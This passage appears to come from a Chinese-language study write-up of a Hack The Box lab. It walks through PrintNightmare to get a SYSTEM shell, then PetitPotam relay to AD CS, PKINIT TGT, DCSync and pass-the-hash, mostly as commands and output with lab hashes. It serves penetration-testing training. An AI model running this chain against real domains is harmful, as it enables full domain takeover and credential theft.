TCP handler on 172.16.5.225:8080 <br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo python3 CVE-2021-1675.py inlanefreight.local/forend:Klmcargo2@172.16.5.5 <span class="hljs-string">&#x27;\\172.16.5.225\CompData\backupscript.dll&#x27;</span><br><br>[*] Connecting to ncacn_np:172.16.5.5[\PIPE\spoolss]<br>[+] Bind OK<br>[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\ntprint.inf_amd64_83aa9aebf5dffc96\Amd64\UNIDRV.DLL<br>[*] Executing \??\UNC\172.16.5.225\CompData\backupscript.dll<br>[*] Try 1...<br>[*] Stage0: 0<br>[*] Try 2...<br>[*] Stage0: 0<br>[*] Try 3...<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">[*] Sending stage (200262 bytes) to 172.16.5.5<br>[*] Meterpreter session 1 opened (172.16.5.225:8080 -&gt; 172.16.5.5:58048 ) at 2022-03-29 13:06:20 -0400<br><br>(Meterpreter 1)(C:\Windows\system32) &gt; shell<br>Process 5912 created.<br>Channel 1 created.<br>Microsoft Windows [Version 10.0.17763.737]<br>(c) 2018 Microsoft Corporation. All rights reserved.<br><br>C:\Windows\system32&gt;<span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>nt authority\system<br></code></pre></td></tr></table></figure>

<h2 id="PetitPotam-MS-EFSRPC"><a href="#PetitPotam-MS-EFSRPC" class="headerlink" title="PetitPotam (MS-EFSRPC)"></a>PetitPotam (MS-EFSRPC)</h2><p>PetitPotam（CVE-2021-36942）是一个 LSA 欺骗漏洞，已于 2021 年 8 月得到修补。该漏洞允许未经身份验证的攻击者通过滥用微软的加密文件系统远程协议（MS-EFSRPC），利用本地安全机构远程协议（LSARPC）强制域控制器使用 NTLM 通过端口 445 向另一主机进行身份验证。此技术使得未经身份验证的攻击者能够在使用 Active Directory 证书服务（AD CS）的 Windows 域中接管控制权。在攻击过程中，来自目标域控制器的身份验证请求被中继到证书颁发机构（CA）主机的 Web 注册页面，并生成一个新的数字证书的证书签名请求（CSR）。然后，可以使用 PKINITtools 中的 <code>Rubeus</code> 或 <code>gettgtpkinit.py</code> 等工具，利用此证书为域控制器请求 TGT，进而通过 DCSync 攻击实现域的攻陷。</p>
<h4 id="启动-ntlmrelayx-py"><a href="#启动-ntlmrelayx-py" class="headerlink" title="启动 ntlmrelayx.py"></a>启动 ntlmrelayx.py</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController<br><br>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - <br><br>Copyright 2021 SecureAuth Corporation<br><br>[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket<br>[*] Protocol Client DCSYNC loaded..<br>[*] Protocol Client HTTP loaded..<br>[*] Protocol Client HTTPS loaded..<br>[*] Protocol Client IMAPS loaded..<br>[*] Protocol Client IMAP loaded..<br>[*] Protocol Client LDAP loaded..<br>[*] Protocol Client LDAPS loaded..<br>[*] Protocol Client MSSQL loaded..<br>[*] Protocol Client RPC loaded..<br>[*] Protocol Client SMB loaded..<br>[*] Protocol Client SMTP loaded..<br>[+] Protocol Attack DCSYNC loaded..<br>[+] Protocol Attack HTTP loaded..<br>[+] Protocol Attack HTTPS loaded..<br>[+] Protocol Attack IMAP loaded..<br>[+] Protocol Attack IMAPS loaded..<br>[+] Protocol Attack LDAP loaded..<br>[+] Protocol Attack LDAPS loaded..<br>[+] Protocol Attack MSSQL loaded..<br>[+] Protocol Attack RPC loaded..<br>[+] Protocol Attack SMB loaded..<br>[*] Running <span class="hljs-keyword">in</span> relay mode to single host<br>[*] Setting up SMB Server<br>[*] Setting up HTTP Server<br>[*] Setting up WCF Server<br></code></pre></td></tr></table></figure>

<h4 id="运行-PetitPotam-py"><a href="#运行-PetitPotam-py" class="headerlink" title="运行 PetitPotam.py"></a>运行 PetitPotam.py</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ python3 PetitPotam.py 172.16.5.225 172.16.5.5       <br>                                                                                 <br>              ___            _        _      _        ___            _                     <br>             | _ \   ___    | |_     (_)    | |_     | _ \   ___    | |_    __ _    _ __   <br>             |  _/  / -_)   |  _|    | |    |  _|    |  _/  / _ \   |  _|  / _` |  | <span class="hljs-string">&#x27;  \  </span><br><span class="hljs-string">            _|_|_   \___|   _\__|   _|_|_   _\__|   _|_|_   \___/   _\__|  \__,_|  |_|_|_| </span><br><span class="hljs-string">          _| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_| &quot;&quot;&quot; |_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;|_|&quot;&quot;&quot;&quot;&quot;| </span><br><span class="hljs-string">          &quot;`-0-0-&#x27;</span><span class="hljs-string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="hljs-string">&#x27;&quot;`-0-0-&#x27;</span><span class="hljs-string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="hljs-string">&#x27;&quot;`-0-0-&#x27;</span><span class="hljs-string">&quot;`-0-0-&#x27;&quot;</span>`-0-0-<span class="hljs-string">&#x27;&quot;`-0-0-&#x27;</span> <br>                                         <br>              PoC to elicit machine account authentication via some MS-EFSRPC <span class="hljs-built_in">functions</span><br>                                      by topotam (@topotam77)<br>      <br>                     Inspired by @tifkin_ &amp; @elad_shamir previous work on MS-RPRN<br><br>Trying pipe lsarpc<br>[-] Connecting to ncacn_np:172.16.5.5[\PIPE\lsarpc]<br>[+] Connected!<br>[+] Binding to c681d488-d850-11d0-8c52-00c04fd90f7e<br>[+] Successfully bound!<br>[-] Sending EfsRpcOpenFileRaw!<br><br>[+] Got expected ERROR_BAD_NETPATH exception!!<br>[+] Attack worked!<br></code></pre></td></tr></table></figure>

<h4 id="捕获用于-DC01-的-Base64-编码证书"><a href="#捕获用于-DC01-的-Base64-编码证书" class="headerlink" title="捕获用于 DC01 的 Base64 编码证书"></a>捕获用于 DC01 的 Base64 编码证书</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ sudo ntlmrelayx.py -debug -smb2support --target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL/certsrv/certfnsh.asp --adcs --template DomainController<br><br>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation<br><br>[+] Impacket Library Installation Path: /usr/local/lib/python3.9/dist-packages/impacket-0.9.24.dev1+20211013.152215.3fe2d73a-py3.9.egg/impacket<br>[*] Protocol Client DCSYNC loaded..<br>[*] Protocol Client HTTPS loaded..<br>[*] Protocol Client HTTP loaded..<br>[*] Protocol Client IMAP loaded..<br>[*] Protocol Client IMAPS loaded..<br>[*] Protocol Client LDAPS loaded..<br>[*] Protocol Client LDAP loaded..<br>[*] Protocol Client MSSQL loaded..<br>[*] Protocol Client RPC loaded..<br>[*] Protocol Client SMB loaded..<br>[*] Protocol Client SMTP loaded..<br>[+] Protocol Attack DCSYNC loaded..<br>[+] Protocol Attack HTTP loaded..<br>[+] Protocol Attack HTTPS loaded..<br>[+] Protocol Attack IMAP loaded..<br>[+] Protocol Attack IMAPS loaded..<br>[+] Protocol Attack LDAP loaded..<br>[+] Protocol Attack LDAPS loaded..<br>[+] Protocol Attack MSSQL loaded..<br>[+] Protocol Attack RPC loaded..<br>[+] Protocol Attack SMB loaded..<br>[*] Running <span class="hljs-keyword">in</span> relay mode to single host<br>[*] Setting up SMB Server<br>[*] Setting up HTTP Server<br>[*] Setting up WCF Server<br><br>[*] Servers started, waiting <span class="hljs-keyword">for</span> connections<br>[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01<span class="hljs-variable">$@172</span>.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL<br>[*] HTTP server returned error code 200, treating as a successful login<br>[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED<br>[*] SMBD-Thread-4: Connection from INLANEFREIGHT/ACADEMY-EA-DC01<span class="hljs-variable">$@172</span>.16.5.5 controlled, attacking target http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL<br>[*] HTTP server returned error code 200, treating as a successful login<br>[*] Authenticating against http://ACADEMY-EA-CA01.INLANEFREIGHT.LOCAL as INLANEFREIGHT/ACADEMY-EA-DC01$ SUCCEED<br>[*] Generating CSR...<br>[*] CSR generated!<br>[*] Getting certificate...<br>[*] GOT CERTIFICATE!<br>[*] Base64 certificate of user ACADEMY-EA-DC01$: <br>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<br>[*] Skipping user ACADEMY-EA-DC01$ since attack was already performed<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h4 id="使用-gettgtpkinit-py-请求-TGT"><a href="#使用-gettgtpkinit-py-请求-TGT" class="headerlink" title="使用 gettgtpkinit.py 请求 TGT"></a>使用 gettgtpkinit.py 请求 TGT</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ python3 /opt/PKINITtools/gettgtpkinit.py INLANEFREIGHT.LOCAL/ACADEMY-EA-DC01\$ -pfx-base64 MIIStQIBAzCCEn8GCSqGSI...SNIP...CKBdGmY= dc01.ccache<br><br>2022-04-05 15:56:33,239 minikerberos INFO     Loading certificate and key from file<br>INFO:minikerberos:Loading certificate and key from file<br>2022-04-05 15:56:33,362 minikerberos INFO     Requesting TGT<br>INFO:minikerberos:Requesting TGT<br>2022-04-05 15:56:33,395 minikerberos INFO     AS-REP encryption key (you might need this later):<br>INFO:minikerberos:AS-REP encryption key (you might need this later):<br>2022-04-05 15:56:33,396 minikerberos INFO     70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275<br>INFO:minikerberos:70f805f9c91ca91836b670447facb099b4b2b7cd5b762386b3369aa16d912275<br>2022-04-05 15:56:33,401 minikerberos INFO     Saved TGT to file<br>INFO:minikerberos:Saved TGT to file<br></code></pre></td></tr></table></figure>

<h4 id="设置-KRB5CCNAME-环境变量"><a href="#设置-KRB5CCNAME-环境变量" class="headerlink" title="设置 KRB5CCNAME 环境变量"></a>设置 KRB5CCNAME 环境变量</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ <span class="hljs-built_in">export</span> KRB5CCNAME=dc01.ccache<br></code></pre></td></tr></table></figure>

<h4 id="使用域控制器-TGT-进行-DCSync"><a href="#使用域控制器-TGT-进行-DCSync" class="headerlink" title="使用域控制器 TGT 进行 DCSync"></a>使用域控制器 TGT 进行 DCSync</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ secretsdump.py -just-dc-user INLANEFREIGHT/administrator -k -no-pass <span class="hljs-string">&quot;ACADEMY-EA-DC01$&quot;</span>@ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL<br><br>Impacket v0.9.24.dev1+20211013.152215.3fe2d73a - Copyright 2021 SecureAuth Corporation<br><br>[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)<br>[*] Using the DRSUAPI method to get NTDS.DIT secrets<br>inlanefreight.local\administrator:500:aad3b435b51404eeaad3b435b51404ee:88ad09182de639ccc6579eb0849751cf:::<br>[*] Kerberos keys grabbed<br>inlanefreight.local\administrator:aes256-cts-hmac-sha1-96:de0aa78a8b9d622d3495315709ac3cb826d97a318ff4fe597da72905015e27b6<br>inlanefreight.local\administrator:aes128-cts-hmac-sha1-96:95c30f88301f9fe14ef5a8103b32eb25<br>inlanefreight.local\administrator:des-cbc-md5:70add6e02f70321f<br>[*] Cleaning up... <br></code></pre></td></tr></table></figure>

<h4 id="运行-klist"><a href="#运行-klist" class="headerlink" title="运行 klist"></a>运行 klist</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ klist<br><br>Ticket cache: FILE:dc01.ccache<br>Default principal: ACADEMY-EA-DC01<span class="hljs-variable">$@INLANEFREIGHT</span>.LOCAL<br><br>Valid starting       Expires              Service principal<br>04/05/2022 15:56:34  04/06/2022 01:56:34  krbtgt/INLANEFREIGHT.LOCAL@INLANEFREIGHT.LOCAL<br></code></pre></td></tr></table></figure>

<h4 id="确认对域控制器的管理员访问权限"><a href="#确认对域控制器的管理员访问权限" class="headerlink" title="确认对域控制器的管理员访问权限"></a>确认对域控制器的管理员访问权限</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">c2tt@htb[/htb]$ crackmapexec smb 172.16.5.5 -u administrator -H 88ad09182de639ccc6579eb0849751cf<br><br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [*] Windows 10.0 Build 17763 x64 (name:ACADEMY-EA-DC01) (domain:INLANEFREIGHT.LOCAL) (signing:True) (SMBv1:False)<br>SMB         172.16.5.5      445    ACADEMY-EA-DC01  [+] INLANEFREIGHT.LOCAL\administrator 88ad09182de639ccc6579eb0849751cf (Pwn3d!)<br></code></pre></td></tr></table></figure>

